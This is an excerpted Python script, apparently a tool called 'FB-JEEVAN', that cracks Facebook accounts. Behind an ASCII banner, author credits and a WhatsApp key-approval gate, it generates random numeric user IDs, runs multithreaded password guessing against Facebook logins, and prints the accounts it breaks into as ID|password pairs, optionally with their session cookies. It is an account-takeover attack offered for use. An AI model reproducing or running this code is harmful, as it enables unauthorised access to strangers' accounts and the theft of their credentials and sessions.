...
\x1b[38;5;46m /_/   \_\_| \_\___| |_/_/   \_\_| \_|                                      
   ...
   {H}    {P}[{H}•{P}] Author    :{warna} JEEVAN                  {N}{H}
  {H}     {P}[{H}•{P}] Facebook  : {H} JEEVAN BEB            {N}{H}    
    {H}.  {P}[{H}•{P}] Whatsapp  : {M}BLANK.             {N}{H}     
  {H}     {P}[{H}•{P}] Github    : {K}github.com/BLANK {N}    {H}   
  {H}     {P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     
   {H}    {P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}     
   {H}    {P}[{H}•{P}] Version   : {H}1                       
   {H}    {P}[{H}•{P}] Tools     : {H}ULTRA GREEN             
   {M}                                                                                                             {P}""")
    print(f"""{GREEN}    ARIYAN DON{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}  {H} The  ARIYAN Is BACK 
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;97m >> WhatsApp A Send Key Bhaii ");
      time.sleep(0.1)
      
      input(' >> Click Enter To Send Your Key ')
      
      os.system('xdg-open https://wa.link/np982d')
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract FB-JEEVAN')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/ARIYAN-AHMED-143");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/Ariyan.of.king143?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-JEEVAN {P}Terminal ');os.system("xdg-open https://www.facebook.com/FB.JEEVAN.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.JEEVAN.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.JEEVAN.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as JEEVAN_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        ...
        for number in idf:
            ...
            if mthd in ['1','01']:JEEVAN_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:JEEVAN_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:JEEVAN_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:JEEVAN_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:JEEVAN_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:JEEVAN_xd.submit(f1,idf,pwv)
            else:
               JEEVAN_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as JEEVAN_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:JEEVAN_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:JEEVAN_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:JEEVAN_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:JEEVAN_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:JEEVAN_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:JEEVAN_xd.submit(f1,idf,pwv)
      else:
       JEEVAN_xd.submit(main,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as JEEVAN_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:JEEVAN_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:JEEVAN_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:JEEVAN_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:JEEVAN_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:JEEVAN_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-JEEVAN.py')
...
def x6():
  ...
  with tred(max_workers=30) as JEEVAN_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:JEEVAN_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:JEEVAN_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:JEEVAN_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:JEEVAN_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:JEEVAN_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:JEEVAN_xd.submit(f1,idf,pwv)
  ...
  with tred(max_workers=30) as JEEVAN_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:JEEVAN_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:JEEVAN_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:JEEVAN_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:JEEVAN_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:JEEVAN_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:JEEVAN_xd.submit(f1,idf,pwv)
      else:
       JEEVAN_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-JEEVAN.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mJEEVAN","\x1b[1;92mJEEVAN","\x1b[1;93mJEEVAN","\x1b[1;94mJEEVAN","\x1b[1;95mJEEVAN","\x1b[1;96mJEEVAN","\x1b[1;97mJEEVAN","\x1b[1;91mJEEVAN","\x1b[1;92mJEEVAN","\x1b[1;93mJEEVAN","\x1b[1;94mJEEVAN","\x1b[1;95mJEEVAN","\x1b[1;96mJEEVAN"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mARIYAN-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}ARIYAN-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
 ...
 for pw in pwv:
  try:
   ...
   if "checkpoint" in po.cookies.get_dict().keys():
    ...
    ok+=1
    print(f'\r{P} [{H}ARIYA -OK{P}] {GREEN}{idf}|{pw}{xxx}')
    if 'y' in cokix:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [ARIYAN-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mARIYAN-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
